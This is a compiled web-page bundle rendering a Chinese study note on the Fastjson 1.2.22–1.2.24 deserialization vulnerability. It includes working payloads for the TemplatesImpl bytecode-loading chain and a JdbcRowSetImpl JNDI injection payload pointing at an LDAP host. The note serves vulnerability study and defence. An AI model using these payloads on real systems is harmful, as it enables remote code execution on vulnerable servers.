import{_ as p,c as l,J as i,m as s,a as t,V as k,o as r,E as a}from"./chunks/framework.WH0rnJL5.js";const o="/assets/image-20240416150617547.cNkHi3Bm.png",d="/assets/image-20240416151603853.-Eu_-3-w.png",g="/assets/image-20240416155420886.GHzm-JeC.png",C="/assets/image-20240416155239841.3r8dgQVf.png",y="/assets/image-20240416220724322.sefZe5eS.png",c="/assets/image-20240416231849467.yiL90MzU.png",B="/assets/image-20240416231932496.4I6x02rW.png",v=JSON.parse('{"title":"2.2FastJson1.2.22-1.2.24 反序列化分析","description":"","frontmatter":{},"headers":[],"relativePath":"笔记/👮🏻网络安全/Java/反序列化/FastJson/Fastjson1.2.(22-24)反序列化分析.md","filePath":"笔记/👮🏻网络安全/Java/反序列化/FastJson/Fastjson1.2.(22-24)反序列化分析.md"}'),u={name:"笔记/👮🏻网络安全/Java/反序列化/FastJson/Fastjson1.2.(22-24)反序列化分析.md"},F=s("h1",{id:"_2-2fastjson1-2-22-1-2-24-反序列化分析",tabindex:"-1"},[t("2.2FastJson1.2.22-1.2.24 反序列化分析 "),s("a",{class:"header-anchor",href:"#_2-2fastjson1-2-22-1-2-24-反序列化分析","aria-label":'Permalink to "2.2FastJson1.2.22-1.2.24 反序列化分析"'},"​")],-1),m=k('<h2 id="_1-漏洞原理" tabindex="-1">1.漏洞原理 <a class="header-anchor" href="#_1-漏洞原理" aria-label="Permalink to &quot;1.漏洞原理&quot;">​</a></h2><p>FastJson 反序列化是因为未对<code>@type</code>字段进行有效的校验导致可以传入恶意的类且反序列化的时候会自动调用<code>setter</code>和无参构造器，在某些情况下会调用<code>getter</code>，当这些方法存在利用点的时候，我们通过传入可控利用点成员变量进行攻击利用。</p><p>Fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法。当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用</p><h2 id="_2-利用分析" tabindex="-1">2.利用分析 <a class="header-anchor" href="#_2-利用分析" aria-label="Permalink to &quot;2.利用分析&quot;">​</a></h2><h3 id="_2-1-templateimpl" tabindex="-1">2.1 TemplateImpl <a class="header-anchor" href="#_2-1-templateimpl" aria-label="Permalink to &quot;2.1 TemplateImpl&quot;">​</a></h3><h4 id="_1-利用链分析" tabindex="-1">(1).利用链分析 <a class="header-anchor" href="#_1-利用链分析" aria-label="Permalink to &quot;(1).利用链分析&quot;">​</a></h4><p>在CC3中，有涉及到关于<code>TemplatesImpl</code>链的利用，其中涉及到3个变量为：<code>_name、_bytecodes、_tfactory</code>。在刚开始的漏洞原理中提到，fastjson在解析json字符串的时候，会去调用getter方法，</p><p>所以说，只解析的json字符串中存在<code>_outputProperties</code>的键值对，那么在解析的过程中会调用到<code>TemplatesImpl#getOutputProperties()</code>，代码如下：</p><img src="'+o+`" alt="image-20240416150617547" style="width:925px;height:385px;text-align:center;"><p>然后再接着调用<code>newTransformer()</code>后就是字节码的加载，这部分内容可以参考CC3,了解这一点之后，可能会想立马构造exp，但是能成功吗？如果进行的构造如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">  byte</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">[] bytes </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> Files</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">readAllBytes</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Paths</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;Exp.class&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">));</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">  String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> text </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;"> &quot;{</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">@type</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">,&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">_bytecodes</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> Arrays</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">toString</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(bytes)</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;,&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;&#39;_name&#39;:&#39;me7eorite&#39;,&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;&#39;_tfactory&#39;:{ },&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">_outputProperties</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:{ }&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;}&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">  Object</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> obj </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> JSON</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">parseObject</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(text,</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Feature</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">SupportNonPublicField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span></code></pre></div><p>编译器是会产生格式错误的报错，显然这种方式是不行的，fastjson应该有自己的处理逻辑，所以往下需要分析一下它的解析过程。</p><p>在FastJson解析过程中，关键代码位于<code>DefaultJSONParser#parseObject()</code>中，其中关键位置如下：</p><img src="`+d+'" alt="image-20240416151603853" style="width:925px;text-align:center;"><p>在该位置，通过传入的<code>@type</code>获取到需要转化的类，对于后续版本中，该类还会涉及到黑名单的绕过。</p><p>往下就涉及到field的处理，主要的处理方式是在于<code>ObjectArrayCodec#deserialze(...)</code>中</p><img src="'+g+'" alt="image-20240416155420886" style="width:925px;"><p>传入后会先判断token的类型，然后采取指定的操作方式，例如：传入的是<code>_bytecodes</code>后会进行base64解码：</p><img src="'+C+`" alt="image-20240416155239841" style="width:925px;"><p>根据以上的分析，这个构造方式就很清晰的：</p><ol><li>利用<code>TemplatesImpl</code>触发，需要<code>_name、_tfactory、_bytecodes</code>变量</li><li>为了触发getter，需要定义<code>_outputProperties</code></li><li><code>_bytecodes</code>赋值的时候存在base64解码，需要编码。</li></ol><p>修改以上的exp，增加一个base64编码即可：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#C678DD;">  byte</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">[] bytes </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> Files</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">readAllBytes</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Paths</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">get</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/Exp.class&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">));</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">  String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> s </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> Base64</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">getEncoder</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">encodeToString</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(bytes);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">  String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> text </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;"> &quot;{</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">@type</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">,&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">_bytecodes</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:[</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;">s</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">],&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;&#39;_name&#39;:&#39;me7eorite&#39;,&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;&#39;_tfactory&#39;:{ },&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">_outputProperties</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:{ }&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;"> +</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">          &quot;}&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">  Object</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> obj </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;"> JSON</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">parseObject</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(text,</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">Feature</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">SupportNonPublicField</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">);</span></span></code></pre></div><p>当构造上述exp的时，或许会产生疑问：构造fastjson反序列化自动调用setter？但是，类中并没有<code>SetName()</code>。为什么还能够正常赋值？</p><p>因为,增加配置<code>Feature.SupportNonPublicField</code>到私有属性会通过反射赋值，其代码位于<code>FieldDeserializer#setValue(...)</code>。部分代码如下：</p><img src="`+y+`" alt="image-20240416220724322" style="width:925px;"><h2 id="_2-2-jdbcrowsetimpl" tabindex="-1">2.2 JdbcRowSetImpl <a class="header-anchor" href="#_2-2-jdbcrowsetimpl" aria-label="Permalink to &quot;2.2 JdbcRowSetImpl&quot;">​</a></h2><h3 id="_1-利用链分析-1" tabindex="-1">(1).利用链分析 <a class="header-anchor" href="#_1-利用链分析-1" aria-label="Permalink to &quot;(1).利用链分析&quot;">​</a></h3><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki shiki-themes github-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">String</span><span style="--shiki-light:#24292E;--shiki-dark:#E06C75;"> payload </span><span style="--shiki-light:#D73A49;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;"> &quot;{</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">@type</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">com.sun.rowset.JdbcRowSetImpl</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">dataSourceName</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">ldap://0.0.0.0:1389/owst18</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">autoCommit</span><span style="--shiki-light:#005CC5;--shiki-dark:#56B6C2;">\\&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#98C379;">:true}&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E5C07B;">JSONObject</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#61AFEF;">parse</span><span style="--shiki-light:#24292E;--shiki-dark:#ABB2BF;">(payload);</span></span></code></pre></div><p>根据之前的分析，FastJson反序列化的时候会调用setter，在该exp中，通过<code>setAutoCommit(...)</code>调用到<code>this.connect()</code></p><img src="`+c+'" alt="image-20240416231849467" style="width:600px;text-align:center;"><p>在<code>this.connect()</code>中，存在var1.lookup(...)，判断如果参数可控，这个位置是可以触发JNDI注入的。</p><img src="'+B+'" alt="image-20240416231932496" style="text-align:center;"><p>配置一个dataSourceName，需要注意的是在exp中这键值对的顺序是不能够随意变化的，FastJson反序列化的时候会按照顺序调用setter。</p><h2 id="贡献者" tabindex="-1">贡献者 <a class="header-anchor" href="#贡献者" aria-label="Permalink to &quot;贡献者&quot;">​</a></h2>',35),E=s("h2",{id:"文件历史",tabindex:"-1"},[t("文件历史 "),s("a",{class:"header-anchor",href:"#文件历史","aria-label":'Permalink to "文件历史"'},"​")],-1);function _(q,A,b,x,D,f){const e=a("NolebasePageProperties"),h=a("NolebaseGitContributors"),n=a("NolebaseGitChangelog");return r(),l("div",null,[F,i(e),m,i(h),E,i(n)])}const P=p(u,[["render",_]]);export{v as __pageData,P as default};
